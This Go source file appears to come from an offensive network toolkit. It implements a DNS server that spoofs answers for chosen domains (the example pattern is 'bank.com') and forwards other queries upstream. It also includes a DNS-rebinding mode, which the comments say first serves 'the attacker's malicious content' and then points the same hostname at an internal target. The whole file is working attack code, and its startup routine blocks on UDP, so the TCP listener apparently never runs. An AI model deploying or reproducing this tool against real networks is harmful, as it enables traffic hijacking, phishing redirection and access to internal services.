// Package dns implements a spoof-capable DNS server with upstream forwarding
// for non-target domains.
package dns

import (
	"context"
	"fmt"
	"log/slog"
	"net"
	"strings"
	"sync"
	"time"

	"github.com/miekg/dns"

	"github.com/qyvora/toha3ee/internal/events"
	"github.com/qyvora/toha3ee/internal/store"
)

// Rule is a single spoof mapping. Pattern may be a plain domain ("bank.com")
// or a wildcard ("*.bank.com"); the latter also matches the base domain.
type Rule struct {
	Pattern string
	Target  net.IP
}

// Rebind alternates DNS answers between the attacker IP and the internal
// target IP on successive queries. The first answer (short TTL) loads the
// attacker's malicious content; once the victim trusts the origin, the next
// answer points the same hostname at the internal target so same-origin
// requests reach it directly.
type Rebind struct {
	Pattern    string
	AttackerIP net.IP
	TargetIP   net.IP
	flip       bool
}

// Server answers DNS queries on port 53, spoofing matching names and
// forwarding everything else upstream.
type Server struct {
	upstream string
	rules    []Rule
	rebinds  []Rebind
	bus      *events.Bus
	db       *store.Store
	log      *slog.Logger

	mu       sync.Mutex
	udpSrv   *dns.Server
	tcpSrv   *dns.Server
	stopOnce sync.Once

	Spoofed      atomicBool
	Queries      atomicInt64
	SpoofedCount atomicInt64
	ReboundCount atomicInt64
}

// New returns a DNS server. If upstream is empty, the system resolver is used
// for forwarding.
func New(upstream string, bus *events.Bus, db *store.Store, log *slog.Logger) *Server {
	if upstream == "" {
		if ip := systemResolver(); ip != nil {
			upstream = ip.String()
		}
	}
	return &Server{
		upstream: upstream,
		bus:      bus,
		db:       db,
		log:      log,
	}
}

// AddRule installs a spoof rule. Duplicate patterns are replaced.
func (s *Server) AddRule(pattern string, target net.IP) {
	pattern = strings.ToLower(strings.TrimSpace(pattern))
	s.mu.Lock()
	defer s.mu.Unlock()
	for i := range s.rules {
		if s.rules[i].Pattern == pattern {
			s.rules[i].Target = target
			return
		}
	}
	s.rules = append(s.rules, Rule{Pattern: pattern, Target: target})
}

// AddRebind installs a DNS-rebinding rule that alternates between the attacker
// IP and the internal target IP on successive queries for the same pattern.
func (s *Server) AddRebind(pattern string, attackerIP, targetIP net.IP) {
	pattern = strings.ToLower(strings.TrimSpace(pattern))
	s.mu.Lock()
	defer s.mu.Unlock()
	for i := range s.rebinds {
		if s.rebinds[i].Pattern == pattern {
			s.rebinds[i].AttackerIP = attackerIP
			s.rebinds[i].TargetIP = targetIP
			return
		}
	}
	s.rebinds = append(s.rebinds, Rebind{Pattern: pattern, AttackerIP: attackerIP, TargetIP: targetIP})
}

// Start launches UDP and TCP listeners on :53 bound to the given addresses.
func (s *Server) Start(addrs []string) error {
	if len(addrs) == 0 {
		addrs = []string{":53"}
	}
	s.Spoofed.Set(len(s.rules) > 0)
	for _, addr := range addrs {
		udp := &dns.Server{Addr: addr, Net: "udp", Handler: dns.HandlerFunc(s.handle)}
		s.mu.Lock()
		s.udpSrv = udp
		s.mu.Unlock()
		if err := udp.ListenAndServe(); err != nil {
			return fmt.Errorf("dns udp %s: %w", addr, err)
		}
		tcp := &dns.Server{Addr: addr, Net: "tcp", Handler: dns.HandlerFunc(s.handle)}
		s.mu.Lock()
		s.tcpSrv = tcp
		s.mu.Unlock()
		if err := tcp.ListenAndServe(); err != nil {
			return fmt.Errorf("dns tcp %s: %w", addr, err)
		}
	}
	return nil
}

// Stop shuts down both listeners.
func (s *Server) Stop() {
	s.stopOnce.Do(func() {
		s.mu.Lock()
		udp, tcp := s.udpSrv, s.tcpSrv
		s.mu.Unlock()
		if udp != nil {
			_ = udp.Shutdown()
		}
		if tcp != nil {
			_ = tcp.Shutdown()
		}
	})
}

// Rules returns a snapshot of the current spoof rules.
func (s *Server) Rules() []Rule {
	s.mu.Lock()
	defer s.mu.Unlock()
	return append([]Rule(nil), s.rules...)
}

func (s *Server) handle(w dns.ResponseWriter, r *dns.Msg) {
	s.Queries.Add(1)
	m := new(dns.Msg)
	m.SetReply(r)
	m.Authoritative = true
	m.RecursionAvailable = false

	q := r.Question[0]
	name := strings.ToLower(q.Name)

	if target, ok := s.rebindMatch(name); ok {
		s.ReboundCount.Add(1)
		switch q.Qtype {
		case dns.TypeA:
			ttl := uint32(1)
			if target.Equal(s.rebindTarget(name)) {
				ttl = 30
			}
			m.Answer = append(m.Answer, &dns.A{
				Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: ttl},
				A:   target.To4(),
			})
		default:
			return
		}
		if s.bus != nil {
			s.bus.Emit(events.TopicLog, fmt.Sprintf("dns.rebind: %s -> %s (alternating)", name, target))
		}
		if s.log != nil {
			s.log.Info("dns rebound", "name", name, "target", target)
		}
		_ = w.WriteMsg(m)
		return
	}

	if target, ok := s.match(name); ok {
		s.SpoofedCount.Add(1)
		switch q.Qtype {
		case dns.TypeA:
			m.Answer = append(m.Answer, &dns.A{
				Hdr: dns.RR_Header{Name: q.Name, Rrtype: dns.TypeA, Class: dns.ClassINET, Ttl: 30},
				A:   target.To4(),
			})
		case dns.TypeAAAA:
			// Optionally map to a v6 target; keep empty to be honest.
			if target.To4() == nil {
				m.Answer = append(m.Answer, &dns.AAAA{
					Hdr:  dns.RR_Header{Name: q.Name, Rrtype: dns.TypeAAAA, Class: dns.ClassINET, Ttl: 30},
					AAAA: target.To16(),
				})
			}
		default:
			return
		}
		if s.bus != nil {
			s.bus.Emit(events.TopicLog, fmt.Sprintf("dns.spoof: %s -> %s", name, target))
		}
		if s.log != nil {
			s.log.Info("dns spoofed", "name", name, "target", target)
		}
		_ = w.WriteMsg(m)
		return
	}

	// Forward upstream.
	up, err := s.forward(r)
	if err != nil {
		_ = w.WriteMsg(m) // empty reply
		return
	}
	_ = w.WriteMsg(up)
}

// rebindMatch returns the answer IP for a rebind rule, alternating on every
// query. The second return tells whether name is governed by a rebind rule.
func (s *Server) rebindMatch(name string) (net.IP, bool) {
	s.mu.Lock()
	defer s.mu.Unlock()
	for i := range s.rebinds {
		if ruleMatches(s.rebinds[i].Pattern, name) {
			s.rebinds[i].flip = !s.rebinds[i].flip
			if s.rebinds[i].flip {
				return s.rebinds[i].AttackerIP, true
			}
			return s.rebinds[i].TargetIP, true
		}
	}
	return nil, false
}

// rebindTarget reports the internal target IP for a rebind pattern.
func (s *Server) rebindTarget(name string) net.IP {
	s.mu.Lock()
	defer s.mu.Unlock()
	for i := range s.rebinds {
		if ruleMatches(s.rebinds[i].Pattern, name) {
			return s.rebinds[i].TargetIP
		}
	}
	return nil
}

func (s *Server) match(name string) (net.IP, bool) {
	s.mu.Lock()
	defer s.mu.Unlock()
	for _, r := range s.rules {
		if ruleMatches(r.Pattern, name) {
			return r.Target, true
		}
	}
	return nil, false
}

// ruleMatches supports exact, wildcard ("*.domain") and catch-all ("*")
// patterns. A wildcard matches the base domain and every subdomain.
func ruleMatches(pattern, name string) bool {
	if pattern == "*" {
		return true
	}
	if pattern == name {
		return true
	}
	if strings.HasPrefix(pattern, "*.") {
		base := strings.TrimPrefix(pattern, "*.")
		if name == base || strings.HasSuffix(name, "."+base) {
			return true
		}
	}
	return false
}

func (s *Server) forward(r *dns.Msg) (*dns.Msg, error) {
	client := &dns.Client{Timeout: 3 * time.Second}
	r.RecursionDesired = true
	if s.upstream != "" {
		resp, _, err := client.Exchange(r, net.JoinHostPort(s.upstream, "53"))
		if err == nil {
			return resp, nil
		}
	}
	// Fall back to the OS resolver.
	return systemExchange(r)
}

// systemResolver returns the first nameserver in /etc/resolv.conf.
func systemResolver() net.IP {
	for _, line := range strings.Split(string(readResolv()), "\n") {
		fields := strings.Fields(line)
		if len(fields) >= 2 && fields[0] == "nameserver" {
			if ip := net.ParseIP(fields[1]); ip != nil {
				return ip
			}
		}
	}
	return nil
}

func readResolv() []byte {
	data, err := osReadFile(resolvConf)
	if err != nil {
		return nil
	}
	return data
}

func systemExchange(r *dns.Msg) (*dns.Msg, error) {
	ctx, cancel := context.WithTimeout(context.Background(), 3*time.Second)
	defer cancel()
	cl := dns.Client{}
	resp, _, err := cl.ExchangeContext(ctx, r, net.JoinHostPort("127.0.0.53", "53"))
	return resp, err
}
